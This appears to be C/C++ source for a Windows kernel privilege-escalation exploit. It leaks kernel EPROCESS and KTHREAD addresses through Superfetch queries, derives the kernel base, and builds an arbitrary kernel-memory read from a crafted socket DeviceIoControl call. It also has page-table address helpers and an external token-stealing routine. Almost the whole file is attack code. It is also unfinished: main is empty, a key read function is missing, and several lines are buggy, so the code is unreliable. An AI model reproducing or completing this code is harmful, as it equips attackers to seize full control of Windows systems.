#include <windows.h>
#include "ntos2.h"
#include <stdio.h>
#include <string.h>
#include <stdint.h>

#pragma comment(lib, "ntdll.lib")
#pragma comment (lib,"psapi")

#define STATUS_INFO_LENGTH_MISMATCH 0xc0000004
#define ObjectThreadType 0x08

extern "C" void TokenStealing();


PULONGLONG leak_buffer = (PULONGLONG)VirtualAlloc((LPVOID)0x000000001a000000, 0x2000, MEM_RESERVE | MEM_COMMIT, PAGE_READWRITE);
PULONGLONG leak_bufferk = (PULONGLONG)VirtualAlloc((LPVOID)0x000000002a000000, 0x2000, MEM_RESERVE | MEM_COMMIT, PAGE_READWRITE);
PULONGLONG leak_ntbase = (PULONGLONG)VirtualAlloc((LPVOID)0x000000003a000000, 0x2000, MEM_RESERVE | MEM_COMMIT, PAGE_READWRITE);
PULONGLONG leak_qwordz = (PULONGLONG)VirtualAlloc((LPVOID)0x000000004a000000, 0x2000, MEM_RESERVE | MEM_COMMIT, PAGE_READWRITE);

ULONGLONG eprocess_leak;

#ifdef DBG
#define DBGPRINT(lvl, fmt, ...) DbgPrintEx(DPFLTR_DEFAULT_ID, lvl , fmt, __VA_ARGS__)
#else
#define DBGPRINT(fmt, ...)
#endif

typedef NTSTATUS(WINAPI* _NtWriteVirtualMemory)(
	_In_ HANDLE ProcessHandle,
	_In_ PVOID BaseAddress,
	_In_ PVOID Buffer,
	_In_ ULONG NumberOfBytesToWrite,
	_Out_opt_ PULONG NumberOfBytesWritten
	);


typedef enum _SUPERFETCH_INFORMATION_CLASS
{
	SuperfetchRetrieveTrace = 0x1,
	SuperfetchSystemParameters = 0x2,
	SuperfetchLogEvent = 0x3,
	SuperfetchGenerateTrace = 0x4,
	SuperfetchPrefetch = 0x5,
	SuperfetchPfnQuery = 0x6,
	SuperfetchPfnSetPriority = 0x7,
	SuperfetchPrivSourceQuery = 0x8,
	SuperfetchSequenceNumberQuery = 0x9,
	SuperfetchScenarioPhase = 0xA,
	SuperfetchWorkerPriority = 0xB,
	SuperfetchScenarioQuery = 0xC,
	SuperfetchScenarioPrefetch = 0xD,
	SuperfetchRobustnessControl = 0xE,
	SuperfetchTimeControl = 0xF,
	SuperfetchMemoryListQuery = 0x10,
	SuperfetchMemoryRangesQuery = 0x11,
	SuperfetchTracingControl = 0x12,
	SuperfetchTrimWhileAgingControl = 0x13,
	SuperfetchInformationMax = 0x14,
} SUPERFETCH_INFORMATION_CLASS;

typedef struct _SUPERFETCH_INFORMATION
{
	ULONG Version;
	ULONG Magic;
	SUPERFETCH_INFORMATION_CLASS InfoClass;
	PVOID Data;
	ULONG Length;
} SUPERFETCH_INFORMATION, * PSUPERFETCH_INFORMATION;

typedef enum _PFS_PRIVATE_PAGE_SOURCE_TYPE {
	PfsPrivateSourceKernel = 0x0,
	PfsPrivateSourceSession = 0x1,
	PfsPrivateSourceProcess = 0x2,
	PrfsPrivateSourceMax = 0x3,
} PFS_PRIVATE_PAGE_SOURCE_TYPE;

#pragma pack(push)
#pragma pack(4)

typedef struct _PFS_PRIVATE_PAGE_SOURCE
{
	PFS_PRIVATE_PAGE_SOURCE_TYPE Type;
	union {
		DWORD SessionId;
		DWORD ProcessId;
	};
	DWORD SpareDwords[2];
	ULONG ImagePathHash;
	ULONG UniqueProcessHash;
} PFS_PRIVATE_PAGE_SOURCE, * PPFS_PRIVATE_PAGE_SOURCE;

typedef struct _PF_PRIVSOURCE_INFO_V3 {
	PFS_PRIVATE_PAGE_SOURCE DbInfo;
	union {
		ULONG_PTR EProcess;
		ULONG_PTR GlobalVA;
	};
	ULONG WsPrivatePages;
	ULONG TotalPrivatePages;
	ULONG SessionID;
	CHAR ImageName[16];
	BYTE SpareBytes[12];
} PF_PRIVSOURCE_INFO_V3, * PPF_PRIVSOURCE_INFO_V3;

typedef struct _PF_PRIVSOURCE_INFO_V3PLUS {
	BYTE data2[8];
	DWORD ProcessId;
	BYTE data3[16];
	ULONG_PTR EProcess;
	BYTE data[60];
} PF_PRIVSOURCE_INFO_V3PLUS, * PPF_PRIVSOURCE_INFO_V3PLUS;

typedef struct _PF_PRIVSOURCE_QUERY_REQUEST {
	ULONG Version;

	union {
		__declspec(align(4)) struct {
			ULONG InfoCount;
			PF_PRIVSOURCE_INFO_V3 InfoArrayV3[1];
		} __sv3;
		__declspec(align(4)) struct {
			ULONG Type;
			ULONG InfoCount;
			PF_PRIVSOURCE_INFO_V3PLUS InfoArrayV3Plus[1];
		} __sv3plus;
	} __u0;
} PF_PRIVSOURCE_QUERY_REQUEST, * PPF_PRIVSOURCE_QUERY_REQUEST;

#pragma pack(pop)

ULONGLONG GetEprocessAddress()
{
	ULONG superfetch_info_size;
	PF_PRIVSOURCE_QUERY_REQUEST* pf_privsource_query_request;
	SUPERFETCH_INFORMATION superfetch_info = { 0 };
	BYTE temp_buffer[0x70];

	ZeroMemory(temp_buffer, sizeof(temp_buffer));

	PPEB peb = (PPEB)NtCurrentTeb()->ProcessEnvironmentBlock;
	DWORD dwBuildNumber = peb->OSBuildNumber;

	*(DWORD*)temp_buffer = 8; // Windows 10

	switch (dwBuildNumber)
	{
	case 7600:
	case 7601:
		*(DWORD*)temp_buffer = 3;
		break;
	case 9200:
		*(DWORD*)temp_buffer = 5;
		break;
	case 9600:
		*(DWORD*)temp_buffer = 6;
		break;
	}
	*(DWORD*)&temp_buffer[4] = 0;

	superfetch_info.InfoClass = SuperfetchPrivSourceQuery;
	superfetch_info.Version = 45;
	superfetch_info.Magic = 'kuhC';
	superfetch_info.Data = temp_buffer;
	superfetch_info.Length = sizeof(temp_buffer);

	NTSTATUS status;
	ULONG pf_privsource_query_request_version = *(DWORD*)temp_buffer;

	status = NtQuerySystemInformation(SystemSuperfetchInformation, &superfetch_info, sizeof(SUPERFETCH_INFORMATION), &superfetch_info_size);

	pf_privsource_query_request = (PF_PRIVSOURCE_QUERY_REQUEST*)LocalAlloc(LPTR, 2 * superfetch_info_size);

	pf_privsource_query_request->__u0.__sv3.InfoCount = 0;
	pf_privsource_query_request->Version = pf_privsource_query_request_version;
	superfetch_info.Data = pf_privsource_query_request;
	superfetch_info.Length = 2 * superfetch_info_size;

	status = NtQuerySystemInformation(SystemSuperfetchInformation, &superfetch_info, sizeof(SUPERFETCH_INFORMATION), &superfetch_info_size);

	if (pf_privsource_query_request_version == 3)
	{
		auto sv3_request = &pf_privsource_query_request->__u0.__sv3;
		for (ULONG i = 0; i < sv3_request->InfoCount; ++i)
		{
			printf("%5d\t%p\n", sv3_request->InfoArrayV3[i].DbInfo.ProcessId, sv3_request->InfoArrayV3[i].EProcess);
		}
	}
	else
	{
		auto sv3plus_request = &pf_privsource_query_request->__u0.__sv3plus;

		for (ULONG i = 0; i < sv3plus_request->InfoCount; ++i)
		{
			auto stringkz = &sv3plus_request->InfoArrayV3Plus[i].data[0x14];
			if (!memcmp(stringkz, "extra_mile", sizeof(stringkz)))
			{
				eprocess_leak = sv3plus_request->InfoArrayV3Plus[i].EProcess;
				printf("%p yes\n", eprocess_leak);
			}
		}
	}

	LocalFree(pf_privsource_query_request);
	return eprocess_leak;
}


ULONGLONG GetKThreadFromEProcess(HANDLE hMdare, ULONGLONG eprocess)
{
	ULONGLONG threadListHead = leak_qword(hMdare, eprocess + 0x5e0);
	ULONGLONG nextThreadLink = threadListHead;

	ULONGLONG result = 0;
	ULONGLONG actualCurrentTeb = (ULONGLONG)NtCurrentTeb();

	do
	{
		ULONGLONG currentThread = nextThreadLink - 0x4e8;
		ULONGLONG currentTeb = leak_qword(hMdare, currentThread + 0xf0);

		if (currentTeb == actualCurrentTeb)
		{
			result = currentThread;
			break;
		}

		nextThreadLink = leak_qword(hMdare, nextThreadLink);
	} while (nextThreadLink != threadListHead);

	return result;
}

ULONGLONG GetNTBaseFromEProcess(HANDLE hMdare, ULONGLONG eprocess)
{
	ULONGLONG threadListHead = leak_qword(hMdare, eprocess + 0x5e0);
	ULONGLONG nextThreadLink = threadListHead;
	printf("%p:<-thread", threadListHead);

	ULONGLONG result = 0;
	ULONGLONG actualCurrentTeb = (ULONGLONG)NtCurrentTeb();
	printf("teb %d %p\n", actualCurrentTeb);
	do
	{
		ULONGLONG currentThread = nextThreadLink - 0x4e8;
		ULONGLONG currentTeb = leak_qword(hMdare, currentThread + 0xf0);

		if (currentTeb == actualCurrentTeb)
		{
			result = currentThread;
			printf("kthread->curent:%p\n", result);
			result = GetNTBaseFromKThread(hMdare, currentThread);
			break;
		}

		nextThreadLink = leak_qword(hMdare, nextThreadLink);
	} while (nextThreadLink != threadListHead);

	return result;
}

ULONGLONG GetNTBaseFromKThread(HANDLE hMdare, ULONGLONG kThread)
{
	ULONGLONG leakedKernelAddr = leak_qword(hMdare, kThread + 0x2b8); // _KTHREAD->SchedulerApc->NormalRoutine
	printf("!!!ntbase-<: %p \n", leakedKernelAddr - 0x20c9d0);
	return leakedKernelAddr - 0x20c9d0;
}

DWORD read_dword(UINT64 addr) {
	WSADATA wsd;
	int status;
	status = WSAStartup(MAKEWORD(2, 2), &wsd);

	SOCKET s = WSASocketA(AF_INET, SOCK_DGRAM, IPPROTO_UDP, NULL, 0, WSA_FLAG_REGISTERED_IO);

	void* inbuffer = VirtualAlloc(NULL, 0x1000, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
	void* outbuffer = VirtualAlloc(NULL, 0x1000, MEM_COMMIT, PAGE_EXECUTE_READWRITE);

	size_t size = 0x40;

	*(DWORD*)((char*)inbuffer + 4) = 0x11;
	*(UINT64*)((char*)inbuffer + 8) = 2;
	*(UINT64*)((char*)inbuffer + 16) = (UINT64)addr;
	*(UINT64*)((char*)inbuffer + 24) = size;
	*(char*)((char*)inbuffer + 12) = 1;
	*(int*)inbuffer = 1;

	DWORD n = 0;
	status = DeviceIoControl((HANDLE)s, 0x120BF, inbuffer, size, NULL, 0, &n, NULL);

	*(int*)inbuffer = 2;
	status = DeviceIoControl((HANDLE)s, 0x120BF, inbuffer, size, outbuffer, size, &n, NULL);
	// printf("leak: %x\n", *(int*)outbuffer);
	return *(DWORD*)outbuffer;
}

ULONGLONG get_pte_address_64(ULONGLONG address, ULONGLONG pte_start)
{
	ULONGLONG pte_va = address >> 9;
	pte_va = pte_va | pte_start;
	pte_va = pte_va & (pte_start + 0x0000007ffffffff8);

	return pte_va;
}

ULONGLONG get_pml4_address_64(ULONGLONG pte_start)
{
	ULONGLONG pml4_start = pte_start & 0x0000fff000000000;
	pml4_start = pml4_start | (pml4_start >> 9);
	pml4_start = pml4_start | (pml4_start >> 9);
	pml4_start = pml4_start | (pml4_start >> 9);
	pml4_start = pml4_start | 0xffff000000000000;

	return pml4_start;
}

int main(int argc, CHAR* argv[])
{
	return 0;

}
